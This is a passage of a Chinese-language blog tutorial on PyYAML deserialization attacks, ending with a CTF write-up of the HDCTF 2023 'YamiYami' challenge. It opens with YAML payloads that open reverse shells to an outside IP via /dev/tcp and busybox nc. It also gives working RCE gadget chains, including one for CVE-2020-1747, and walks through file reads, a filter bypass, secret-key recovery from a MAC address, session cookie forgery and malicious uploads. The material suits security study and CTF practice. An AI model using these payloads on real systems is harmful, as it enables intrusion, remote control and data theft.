+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="type">!!python/object/apply:os.system</span> [<span class="string">&#x27;sh -i &gt;&amp; /dev/tcp/10.200.68.69/4444 0&gt;&amp;1&#x27;</span>]</span><br><span class="line"><span class="type">!!python/object/apply:os.system</span> [<span class="string">&#x27;sh -i 5&lt;&gt; /dev/tcp/10.200.68.69/4444 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5&#x27;</span>]</span><br><span class="line"><span class="type">!!python/object/apply:os.system</span> [<span class="string">&#x27;busybox nc 10.200.68.69 4444 -e sh&#x27;</span>]</span><br><span class="line"><span class="string">....</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="2-2-python-name"><a href="#2-2-python-name" class="headerlink" title="2.2:!!python\name"></a>2.2:!!python\name</h5><p>返回对象本身,在payload中只引用不调用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml  </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(yaml.load(<span class="string">&#x27;!!python/name:eval&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>返回类型 ：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS F:\download\pyyaml_lab&gt; &amp; F:\venv\pyaml42b4\Scripts\python.exe f:/download/pyyaml_lab/blank.py</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml  </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(yaml.load(<span class="string">&#x27;!!python/name:exec&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>exec 同样返回function exec</p>
+<p>!!python&#x2F;name:math.pi </p>
+<p>引用math模块的pi常量，在yaml反序列化中，用于进行引用指定模块或者方法</p>
+<p>另外，文件中存在某个自定义函数，也可以通过该标签进行调用：</p>
+<p>a.py:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">a</span>():</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;你好世界！&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml  </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(yaml.load(<span class="string">&#x27;!!python/name:a.a&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS F:\download\pyyaml_lab&gt; &amp; F:\venv\pyaml42b4\Scripts\python.exe f:/download/pyyaml_lab/blank.py</span><br><span class="line">&lt;function a at 0x00000271589FB3A0&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-3-python-object-new"><a href="#2-3-python-object-new" class="headerlink" title="2.3 !!python&#x2F;object&#x2F;new"></a>2.3 !!python&#x2F;object&#x2F;new</h5><p>允许直接创建新的 Python 对象，通过yaml模板来创建新的对象：</p>
+<p>语法如下</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!python/object/new:</span><span class="string">&lt;class&gt;</span></span><br><span class="line"><span class="attr">args:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">arg1</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">arg2</span></span><br><span class="line"><span class="attr">state:</span></span><br><span class="line">  <span class="attr">attribute1:</span> <span class="string">value1</span></span><br><span class="line">  <span class="attr">attribute2:</span> <span class="string">value2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>class 表示要new的类名</li>
+<li>arg1,arg2表示传递给new 类名的参数</li>
+<li>state 则表示设置属性</li>
+</ul>
+<p>例子：</p>
+<p>简写：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!python/object/new:os.system</span> [<span class="string">&quot;calc&quot;</span>]</span><br><span class="line"><span class="type">!!python/object/new:subprocess</span> [[<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;-ail&quot;</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment">#new os对象调用system方法,执行的命令就是args</span></span><br><span class="line"><span class="comment">#subprocess同理</span></span><br></pre></td></tr></table></figure>
+
+<p>复杂利用：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!python/object/new:str</span></span><br><span class="line"><span class="attr">state:</span> <span class="type">!!python/tuple</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&#x27;print(getattr(open(&quot;flag\x2etxt&quot;), &quot;read&quot;)())&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="type">!!python/object/new:Warning</span></span><br><span class="line">  <span class="attr">state:</span></span><br><span class="line">    <span class="attr">update:</span> <span class="type">!!python/name:exec</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>先创建一个名为str的对象</p>
+</li>
+<li><p>接着设置成员属性的值为!!python&#x2F;tuple </p>
+</li>
+<li><p>成员属性的两个参数为</p>
+<ul>
+<li>‘print(getattr(open(“flag\x2etxt”), “read”)())’</li>
+<li>!!python&#x2F;object&#x2F;new:Warning</li>
+</ul>
+</li>
+<li><p>最后给Warning 的update属性换成exec 最终导致RCE</p>
+</li>
+</ul>
+<p>等价：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(&#x27;print(getattr(open(&quot;flag.txt&quot;), &quot;read&quot;)())&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>因为将warning类替换为exec 所以达到了命令执行的效果</p>
+<p>变种：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">!!python/object/new:type</span><br><span class="line">    args:</span><br><span class="line">     - exp</span><br><span class="line">     - !!python/tuple []</span><br><span class="line">     - &#123;&quot;extend&quot;: !!python/name:exec &#125;</span><br><span class="line">    listitems: |</span><br><span class="line">    &#x27;python code&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>创建一个动态类，类的名字为exp ，再创建一个tuple 基类（type.<strong>new</strong> 检查第 2 个参数必须是 tuple） ，最后将extend指向exec </p>
+<p>执行 listitems中的代码</p>
+<h4 id="补充：CVE-2020-1747"><a href="#补充：CVE-2020-1747" class="headerlink" title="补充：CVE-2020-1747"></a>补充：CVE-2020-1747</h4><p>版本：5.1  5.2 </p>
+<p>针对于full_load的攻击：</p>
+<p>FullLoader 把 python&#x2F;* 标签全放开了，只靠”不自动 import + 目标必须是类”两道弱限制；因为 object&#x2F;new 允许对任意类做 __new__，而 map&#x2F;tuple 这类类配合 !!python&#x2F;name:eval 就能执行代码 </p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">!!python/object/new:tuple</span><br><span class="line">- !!python/object/new:map</span><br><span class="line">  - !!python/name:eval</span><br><span class="line">  - [&quot;__import__(&#x27;os&#x27;).system(&#x27;calc&#x27;)&quot;]</span><br></pre></td></tr></table></figure>
+
+<p>一旦迭代tuple,就会触发map，从而导致eval执行  calc</p>
+<p>tuple(map(eval(“payload”)))</p>
+<h5 id="题目：-HDCTF-2023-YamiYami"><a href="#题目：-HDCTF-2023-YamiYami" class="headerlink" title="题目：[HDCTF 2023]YamiYami"></a>题目：[HDCTF 2023]YamiYami</h5><p>打开页面</p>
+<img src="/2026/09/17/Web%E5%AE%89%E5%85%A8--Pyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260917165640967.png" class="">
+
+<p>有三个链接</p>
+<ul>
+<li>read somethings</li>
+<li>上传文件</li>
+<li>显示当前的位置</li>
+</ul>
+<p>1.尝试包含文件：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:27935/read?url=file:///etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>发现能成功</p>
+<img src="/2026/09/17/Web%E5%AE%89%E5%85%A8--Pyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260917165813782.png" class="">
+
+<p>尝试查看&#x2F;pwd看看当前位置</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:27935/pwd</span><br></pre></td></tr></table></figure>
+
+<p>返回:</p>
+<img src="/2026/09/17/Web%E5%AE%89%E5%85%A8--Pyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260917165859428.png" class="">
+
+<p>查看&#x2F;upload路由：</p>
+<img src="/2026/09/17/Web%E5%AE%89%E5%85%A8--Pyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260917165938395.png" class="">
+
+<p>YamiYami 猜测可能是上传yaml文件，但是我们先不测试</p>
+<p>都有文件包含 第一件事肯定是查看源码或者flag:</p>
+<p>直接读取&#x2F;flag发现对关键字有过滤，下面查看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:27935/read?url=file:////proc/self/environ</span><br></pre></td></tr></table></figure>
+
+<p>看看脚本的名字：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLASK_APP=app.py</span><br></pre></td></tr></table></figure>
+
+<p>因此猜测脚本位置是&#x2F;app&#x2F;app.py 尝试读取：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)</span><br></pre></td></tr></table></figure>
+
+<p>也被过滤了：</p>
+<p>但是：<code>urllib.request.urlopen</code> 可以直接接受urlencode的路径, 但是读本地文件时最前面的 <code>/</code> 要保留, 不能编码为 %2F</p>
+<p>提交上去后服务器会进行一次解码，所以对于这点我们对该路径进行二次编码得到：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re, random, uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">False</span></span><br><span class="line">BLACK_LIST=[<span class="string">&quot;yaml&quot;</span>,<span class="string">&quot;YAML&quot;</span>,<span class="string">&quot;YML&quot;</span>,<span class="string">&quot;yml&quot;</span>,<span class="string">&quot;yamiyami&quot;</span>]</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>]=<span class="string">&quot;/app/uploads&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;passport&#x27;</span>] = <span class="string">&#x27;YamiYami&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Welcome to HDCTF2023 &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Enjoy it &lt;a href=&quot;/pwd&quot;&gt;pwd&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pwd&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwd</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(pwdpath)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;app.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        <span class="keyword">if</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)&quot;</span></span><br><span class="line">        res = urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">   <span class="keyword">for</span> blackstr <span class="keyword">in</span> BLACK_LIST:</span><br><span class="line">       <span class="keyword">if</span> blackstr <span class="keyword">in</span> filename:</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            flash(<span class="string">&#x27;No file part&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Empty file&quot;</span></span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./uploads/&#x27;</span>):</span><br><span class="line">                os.makedirs(<span class="string">&#x27;./uploads/&#x27;</span>)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;upload successfully!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/boogipop&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>)==<span class="string">&quot;Welcome To HDCTF2023&quot;</span>:</span><br><span class="line">        LoadedFile=request.args.get(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(LoadedFile):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(LoadedFile) <span class="keyword">as</span> f:</span><br><span class="line">            yaml.full_load(f)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwdpath = os.popen(<span class="string">&quot;pwd&quot;</span>).read()</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>接下来就是喜闻乐见的代码审计环节</p>
+<p>审计路由&#x2F;upload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            flash(<span class="string">&#x27;No file part&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Empty file&quot;</span></span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./uploads/&#x27;</span>):</span><br><span class="line">                os.makedirs(<span class="string">&#x27;./uploads/&#x27;</span>)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;upload successfully!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>不允许上传黑名单后缀的文件，也用secure_filename 函数过滤路文件名径穿越漏洞</p>
+<p>隐藏路由：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/boogipop&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>)==<span class="string">&quot;Welcome To HDCTF2023&quot;</span>:</span><br><span class="line">        LoadedFile=request.args.get(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(LoadedFile):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(LoadedFile) <span class="keyword">as</span> f:</span><br><span class="line">            yaml.full_load(f)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwdpath = os.popen(<span class="string">&quot;pwd&quot;</span>).read()</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>自定义了一个Load函数 首先要获取passport 的值 并修改成Welcome To HDCTF2023 才能调用file参数，并判断包含的文件是否存在，文件存在则使用yaml.full_load() 来对yaml文件进行反序列化操作 漏洞点在于可控的file被yaml,full_load反序列化</p>
+<p>但是要想进入路由，我们就要先拿到flask的secret_key ：</p>
+<p>查看session相关代码 ：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br></pre></td></tr></table></figure>
+
+<p>种子是uuid.getnode 看似安全，但是我们知道了mac地址就有办法推算出来：</p>
+<p>直接包含文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:27935/read?url=file:///sys/class/net/eth0/address</span><br></pre></td></tr></table></figure>
+
+<p>返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">02:42:ac:10:00:0f</span><br></pre></td></tr></table></figure>
+
+<p>算出种子：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mac = <span class="built_in">input</span>(<span class="string">&#x27;input your mac:  &#x27;</span>)</span><br><span class="line">mac_int = <span class="built_in">int</span>(mac.replace(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;&#x27;</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(mac_int)</span><br><span class="line">secret = <span class="built_in">str</span>(random.random() * <span class="number">233</span>)</span><br><span class="line"><span class="built_in">print</span>(secret)        </span><br></pre></td></tr></table></figure>
+
+<p>seed：199.20129326574246</p>
+<p>flask伪造:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">╭─ /home/kali/Desktop  took 9s <span class="keyword">with</span> root@kali at 05:<span class="number">32</span>:<span class="number">20</span> ─╮</span><br><span class="line">╰─❯ flask-unsign -s -S <span class="number">199.20129326574246</span> --no-literal-<span class="built_in">eval</span> -c <span class="string">&quot;&#123;&#x27;passport&#x27;:&#x27;Welcome To HDCTF2023&#x27;&#125;&quot;</span>                                                                             ─╯</span><br><span class="line">eyJwYXNzcG9ydCI6IldlbGNvbWUgVG8gSERDVEYyMDIzIn0.aquzyA.yRoYqrpwPQjrAVAh20bdWi-EoKQ</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这样就可以访问&#x2F;boogipop路由了：</p>
+<p>在此之前我们先通过上传页面上传一份恶意的yaml文档，后缀采用.txt即可,yaml.full_load只对yaml 内容进行解析</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!python/object/new:tuple</span></span><br><span class="line"><span class="bullet">-</span> <span class="type">!!python/object/new:map</span></span><br><span class="line">  <span class="bullet">-</span> <span class="type">!!python/name:eval</span></span><br><span class="line">  <span class="bullet">-</span> [<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls -la / &gt; /tmp/o1 2&gt;&amp;1&#x27;)&quot;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>上传这个模板查看 &#x2F; 的文件</p>
+<p>上传成功，接着带上伪造的token去访问&#x2F;boogipop路由包含上传的.txt文件 触发yaml.full_load </p>
+<img src="/2026/09/17/Web%E5%AE%89%E5%85%A8--Pyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260917174506721.png" class="">
+
+<p>触发成功，返回van you see</p>
+<p>接下来通过&#x2F;read的文件包含包含 &#x2F;tmp&#x2F;o1</p>
+<img src="/2026/09/17/Web%E5%AE%89%E5%85%A8--Pyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260917174625833.png" class="">
+
+<p>cat &#x2F;flag.sh</p>
+<img src="/2026/09/17/Web%E5%AE%89%E5%85%A8--Pyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260917175034000.png" class="">
+
+<img src="/2026/09/17/Web%E5%AE%89%E5%85%A8--Pyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260917175234607.png" class="">
+
+<p>返回：NSSCTF{124b28b0-f947-4def-b534-b3b32f3aa156}</p>
